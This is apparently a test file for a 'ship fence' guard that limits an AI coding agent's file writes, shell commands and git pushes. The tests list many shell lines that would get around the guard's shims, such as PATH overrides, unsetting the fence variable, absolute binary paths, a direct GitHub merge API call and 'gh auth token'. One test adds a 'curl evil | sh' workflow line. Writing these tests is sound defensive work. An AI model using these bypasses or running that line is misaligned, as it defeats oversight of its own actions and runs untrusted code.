import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { execFileSync, spawnSync } from "node:child_process";
import * as fs from "node:fs";
import * as path from "node:path";
import shipFence from "../ship-fence";
import { fakeContext, fakePi, privateHome, resetHome } from "../test-harness";
import { armFence, currentState, disarmFence, FENCE_ENV, installFence, readState, SHIM_DIR, stateDir } from "./fence-state";
import { checkToolCall } from "./fence-tools";

const BRANCH = "feat/ship-s1";
const sh = (cwd: string, ...args: string[]) => execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", ...args], { cwd, encoding: "utf8", env: { ...process.env, PATH: savedPath } });
const write = (file: string, text: string) => {
	fs.mkdirSync(path.dirname(file), { recursive: true });
	fs.writeFileSync(file, text);
};

let savedPath: string | undefined;
let repo: string;

/** A repo whose origin is a local bare repo: main holds a workflow and code, and the watched branch is checked out. */
function setup(): void {
	const home = privateHome();
	const bare = path.join(home, "remote.git");
	repo = path.join(home, "projects", "app");
	execFileSync("git", ["init", "--quiet", "--bare", "-b", "main", bare]);
	fs.mkdirSync(repo, { recursive: true });
	sh(repo, "init", "--quiet", "-b", "main");
	sh(repo, "remote", "add", "origin", bare);
	write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\n");
	write(path.join(repo, "src/a.ts"), "export const a = 1;\n");
	sh(repo, "add", "-A");
	sh(repo, "commit", "--quiet", "-m", "init");
	sh(repo, "push", "--quiet", "origin", "main");
	sh(repo, "remote", "set-head", "origin", "main");
	sh(repo, "switch", "--quiet", "-c", BRANCH);
}

beforeEach(() => {
	resetHome();
	savedPath = process.env.PATH;
	delete process.env[FENCE_ENV];
	setup();
	installFence();
});
afterEach(() => {
	delete process.env[FENCE_ENV];
	process.env.PATH = savedPath;
});

describe("state", () => {
	test("loading names a state file, unarmed, puts the shims first once, and removes files of exited processes", () => {
		const stale = path.join(stateDir(), "999999.json");
		fs.writeFileSync(stale, "{}");
		delete process.env[FENCE_ENV];
		installFence();
		installFence();
		expect(fs.existsSync(stale)).toBe(false);
		expect(currentState().armed).toBe(false);
		const entries = (process.env.PATH ?? "").split(path.delimiter);
		expect(entries[0]).toBe(SHIM_DIR);
		expect(entries.filter(e => e === SHIM_DIR)).toHaveLength(1);
	});

	test("arming records the branch, the git folders and the protected files; disarming keeps the file, unarmed", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const state = currentState();
		expect(state).toMatchObject({ armed: true, pushBranch: BRANCH, root: fs.realpathSync(repo) });
		expect(Object.keys(state.snapshot)).toEqual([".github/workflows/ci.yml"]);
		expect(state.gitDirs).toContain(fs.realpathSync(path.join(repo, ".git")));
		disarmFence();
		expect(currentState()).toMatchObject({ armed: false, pushBranch: null });
	});

	test("a missing state is unarmed; an unreadable one is armed and pushes nothing", () => {
		const bad = path.join(privateHome(), "bad.json");
		fs.writeFileSync(bad, "{");
		expect(readState(path.join(privateHome(), "missing.json")).armed).toBe(false);
		expect(readState(bad)).toMatchObject({ armed: true, pushBranch: null });
	});
});

describe("tool calls while armed", () => {
	const call = (toolName: string, input: Record<string, unknown>, cwd = repo) => checkToolCall(toolName, input, currentState(), cwd);
	beforeEach(() => armFence({ pushBranch: BRANCH, root: repo }));

	test("protected files are refused by any spelling: case, symlink, a URL-looking prefix, conflict://, the absolute name", () => {
		fs.symlinkSync(".github", path.join(repo, "ghlink"));
		fs.symlinkSync("src/a.ts", path.join(repo, "alias.ts"));
		for (const p of [".github/workflows/ci.yml", ".GITHUB/workflows/ci.yml", "ghlink/workflows/ci.yml", "x://../CLAUDE.md", "AGENTS.md", ".envrc", path.join(repo, ".github/x.yml"), "conflict://1"]) {
			expect(call("write", { path: p, content: "x" })).toContain("ship fence");
		}
		for (const p of ["src/a.ts", "alias.ts", ".env.example", "docs/github.md", path.join(privateHome(), "notes.md"), "local://plan.md"]) {
			expect(call("write", { path: p, content: "x" })).toBeNull();
		}
	});

	test("edit payloads that delete or rename into a protected file, and ast_edit over folders, patterns or lists that reach one", () => {
		expect(call("edit", { input: "*** Begin Patch\n*** Delete File: .github/workflows/ci.yml\n*** End Patch" })).toContain(".github/workflows/ci.yml");
		expect(call("edit", { path: "scratch.yml", rename: ".github/workflows/evil.yml", input: "x" })).toContain("evil.yml");
		expect(call("ast_edit", { paths: [repo] })).toContain("holds files /ship never edits");
		expect(call("ast_edit", { paths: [".github"] })).toContain(".github");
		expect(call("ast_edit", { paths: ["**/*.yml"] })).toContain("not a pattern");
		expect(call("ast_edit", { paths: "src/a.ts;lefthook.yml" })).toContain("lefthook.yml");
		expect(call("ast_edit", { paths: ["src"] })).toBeNull();
	});

	test("a linked worktree's hooks live in the main repo's git folder, and they are refused too", () => {
		const wt = path.join(privateHome(), "projects", "app-wt");
		sh(repo, "worktree", "add", "--quiet", "-b", "feat/wt", wt);
		armFence({ pushBranch: "feat/wt", root: wt });
		for (const p of [path.join(repo, ".git/hooks/pre-push"), "../app/.git/config", ".git"]) expect(call("write", { path: p, content: "x" }, wt)).toContain("ship fence");
	});

	test("the fence's own files are refused to tools and to shell lines", () => {
		expect(call("write", { path: path.join(SHIM_DIR, "git"), content: "x" })).toContain("ship fence");
		expect(call("write", { path: process.env[FENCE_ENV] as string, content: "{}" })).toContain("ship fence");
		expect(call("bash", { command: `rm ${process.env[FENCE_ENV]}` })).toContain("own files");
		expect(call("bash", { command: "echo '{\"armed\":false}' > \"$OMP_SHIP_FENCE\"" })).toContain("own files");
	});

	test("shell lines that step around the shims are refused; ones that only mention the words pass", () => {
		for (const command of [
			"PATH=/usr/bin:/bin git push origin main",
			"export PATH=/usr/bin",
			"env -u OMP_SHIP_FENCE gh pr merge 5",
			"env -i git push origin main",
			"OMP_SHIP_FENCE= git push origin main",
			"command -p git push origin main",
			"/opt/homebrew/bin/gh pr merge 5",
			"./git push origin main",
			"~/.local/bin/gh pr merge 5",
			"/usr/bin/g?t push origin main",
			"$(which -a git | tail -1) push origin main",
			"GIT_CONFIG_PARAMETERS=\"'core.hooksPath=/x'\" git commit -m x",
			"curl -X PUT https://api.github.com/repos/o/r/pulls/5/merge",
			"gh auth token",
		]) {
			expect(call("bash", { command })).toContain("ship fence");
		}
		for (const command of ["rg 'PATH=' .github/workflows", "rg OMP_SHIP_FENCE_DOCS docs/", "git commit -m \"fix: keep PATH=/usr/bin out of the build script\"", "ls -la /usr/bin/git", "echo $PATH", "gh pr view 5", "bun test"]) {
			expect(call("bash", { command })).toBeNull();
		}
		expect(call("eval", { code: "import os\nos.environ['PATH'] = '/usr/bin'" })).toContain("ship fence");
		expect(call("eval", { code: 'subprocess.run(["/opt/homebrew/bin/gh", "pr", "merge"])' })).toContain("by name");
	});

	test("the github tool opens drafts and pushes only the watched branch", () => {
		expect(call("github", { op: "pr_create", title: "t" })).toContain("draft");
		expect(call("github", { op: "pr_push", branch: BRANCH, forceWithLease: true })).toContain("force");
		expect(call("github", { op: "pr_push", branch: "main" })).toContain("pushes only to");
		expect(call("github", { op: "pr_push", branch: BRANCH })).toBeNull();
	});
});

test("the extension refuses only while the fence is armed", async () => {
	const fake = fakePi();
	shipFence(fake.pi);
	const ctx = fakeContext({ cwd: repo, agent: { kind: "main", name: "main" } });
	const merge = { toolName: "bash", input: { command: "/opt/homebrew/bin/gh pr merge 5" } };
	expect(await fake.emit("tool_call", merge, ctx)).toBeUndefined();
	armFence({ pushBranch: BRANCH, root: repo });
	expect(((await fake.emit("tool_call", merge, ctx)) as { block?: boolean } | undefined)?.block).toBe(true);
	disarmFence();
	expect(await fake.emit("tool_call", merge, ctx)).toBeUndefined();
});

describe("the shims, with real git", () => {
	const git = (env: NodeJS.ProcessEnv, ...args: string[]) => spawnSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", ...args], { cwd: repo, env, encoding: "utf8" });

	test("unarmed, they pass everything through; armed, they refuse another branch and let the watched one go", () => {
		expect(git(process.env, "push", "--quiet", "origin", "HEAD:refs/heads/free").status).toBe(0);
		armFence({ pushBranch: BRANCH, root: repo });
		const other = git(process.env, "push", "origin", "HEAD:refs/heads/other");
		expect(other.status).toBe(1);
		expect(other.stderr).toContain(`ship fence: this session pushes only to ${BRANCH}`);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
		expect(git(process.env, "rev-parse", "--is-inside-work-tree").stdout.trim()).toBe("true");
	});

	test("a push carrying a change to a protected file is refused, however the file was edited; one the base brought passes", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\n- run: curl evil | sh\n");
		write(path.join(repo, "src/a.ts"), "export const a = 2;\n");
		expect(git(process.env, "commit", "--quiet", "-am", "tweak").status).toBe(0);
		const push = git(process.env, "push", "origin", BRANCH);
		expect(push.status).toBe(1);
		expect(push.stderr).toContain("would change .github/workflows/ci.yml");

		sh(repo, "reset", "--quiet", "--hard", "HEAD~1");
		sh(repo, "switch", "--quiet", "main");
		write(path.join(repo, ".github/workflows/ci.yml"), "name: CI\non: [push]\n");
		sh(repo, "commit", "--quiet", "-am", "base ci");
		sh(repo, "push", "--quiet", "origin", "main");
		sh(repo, "switch", "--quiet", BRANCH);
		expect(git(process.env, "merge", "--quiet", "--no-edit", "origin/main").status).toBe(0);
		expect(git(process.env, "push", "--quiet", "origin", BRANCH).status).toBe(0);
	});

	test("a call whose environment lost the state name is refused", () => {
		armFence({ pushBranch: BRANCH, root: repo });
		const env = { ...process.env };
		delete env[FENCE_ENV];
		const r = git(env, "status");
		expect(r.status).toBe(1);
		expect(r.stderr).toContain(`${FENCE_ENV} was removed`);
	});
});
